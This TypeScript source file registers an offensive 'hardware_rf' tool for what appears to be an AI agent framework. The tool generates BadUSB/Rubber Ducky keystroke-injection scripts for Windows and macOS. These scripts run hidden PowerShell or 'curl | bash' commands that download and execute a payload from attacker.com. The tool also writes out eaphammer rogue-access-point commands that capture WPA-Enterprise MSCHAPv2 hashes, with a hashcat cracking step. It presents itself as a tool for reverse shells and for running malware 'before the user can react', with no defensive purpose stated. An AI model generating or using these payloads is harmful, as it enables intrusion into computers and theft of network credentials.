export * as HardwareRfTool from "./hardware-rf"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "hardware_rf"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'hid_inject' (Generate Rubber Ducky / BadUSB payloads), 'wifi_deauth' (802.11 deauth attack script), 'eap_downgrade' (WPA-Enterprise downgrade to capture MSCHAPv2 hashes), 'ble_spoof' (Bluetooth Low Energy GATT spoofing/cloning).",
  }),
  os: Schema.String.pipe(Schema.optional).annotate({
    description: "Target OS for HID injection (windows, macos, linux).",
  }),
  payload_url: Schema.String.pipe(Schema.optional).annotate({
    description: "URL to download payload for HID attacks.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  ducky_script: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Hardware and RF Toolkit. Generates payloads for physical air-gap bridging. Capabilities: BadUSB / Rubber Ducky HID injection script generation (rapid reverse shell execution via physical access), Wi-Fi deauth and Enterprise EAP downgrade attack coordination, and Bluetooth Low Energy (BLE) spoofing.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let script = ""
              let outputText = ""

              if (action === "hid_inject") {
                const os = (input.os || "windows").toLowerCase()
                outputText = `# BadUSB / Rubber Ducky HID Injection Payload\n\nTarget OS: ${os}\nDelivery: Physical USB insertion. Executes keystrokes at superhuman speed to download and run malware before the user can react.`
                
                if (os === "windows") {
                  script = `REM DuckyScript for Windows - Download and Execute Reverse Shell
REM Bypasses UAC if user is local admin, otherwise runs as standard user
DELAY 1000
GUI r
DELAY 200
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri '${input.payload_url || "http://attacker.com/payload.exe"}' -OutFile $env:temp\\payload.exe; Start-Process -FilePath $env:temp\\payload.exe"
ENTER
`
                } else if (os === "macos") {
                  script = `REM DuckyScript for macOS - Download and Execute
DELAY 1000
GUI SPACE
DELAY 200
STRING Terminal
ENTER
DELAY 500
STRING curl -sL ${input.payload_url || "http://attacker.com/payload.sh"} | bash & exit
ENTER
`
                }
              } else if (action === "eap_downgrade") {
                outputText = `# WPA-Enterprise (802.1x) EAP Downgrade Attack`
                script = `# Use hostapd-wpe or EAPhammer to setup a rogue AP
# When enterprise users connect, force downgrade from TLS to PEAP/MSCHAPv2
# Capture the MSCHAPv2 challenge/response hash

eaphammer --cert-wizard
eaphammer -i wlan1 -e "Corporate_WiFi" --creds
# Once hashes are captured, crack with:
# hashcat -m 5500 hashes.txt wordlist.txt
`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, ducky_script: script }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Hardware/RF failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/hardware-rf",
  layer,
  deps: [ToolRegistry.node],
})
